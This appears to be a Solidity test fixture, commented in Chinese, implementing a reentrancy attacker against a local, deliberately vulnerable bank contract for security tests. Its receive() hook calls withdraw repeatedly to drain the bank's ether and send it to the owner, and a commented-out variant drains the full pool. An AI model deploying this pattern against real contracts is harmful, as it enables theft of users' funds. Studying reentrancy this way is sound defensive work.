// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./VulnerableBank.sol";
/**
 * 攻击者合约（重入攻击）
 */
contract Attacker {

    // 漏洞合约
    VulnerableBank public bank;
    // 攻击合约 发起者
    address public owner;
    bool public attacking;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
        owner = msg.sender;
    }

    function attackDeposit() external payable {
        require(msg.sender == owner, "Not owner");
        // 攻击合约 存钱
        bank.deposit{value: msg.value}();
    }

    function attackWithdraw() external {
        require(msg.sender == owner, "Not owner");
        attacking = true;

        // 查看攻击合约的账户
        uint256 myBal = bank.getBalance();
        require(myBal > 0, "No balance to withdraw");

        // 攻击合约进行取钱
        bank.withdraw(myBal);
    }

    // 重入钩子
    receive() external payable {
        if (attacking) {
            // bank 的余额
            uint256 bankEth = address(bank).balance;

            // testAttackSucceeds 使用
            // 攻击合约 持有 bank 的余额
            uint256 myLogical = bank.getBalance();
            if (bankEth > 0) {
                uint256 amount = bankEth < myLogical ? bankEth : myLogical;
                bank.withdraw(amount);
            } else {
                attacking = false;
                // 接受这是 owner
                // 调用者是 当前合约
                payable(owner).transfer(address(this).balance);
            }

            // testSecureBankResistsAttack 使用
            // 攻击合约 持有 bank 的余额
            // 直接忽略 myLogical 或允许为 0 ，以便进入重入攻击
//            if (bankEth > 0) {
//                uint256 amount = bankEth; // 或固定攻击额度
//                bank.withdraw(amount);
//            } else {
//                attacking = false;
//                // 接受这是 owner
//                // 调用者是 当前合约
//                payable(owner).transfer(address(this).balance);
//            }

        }
    }

}
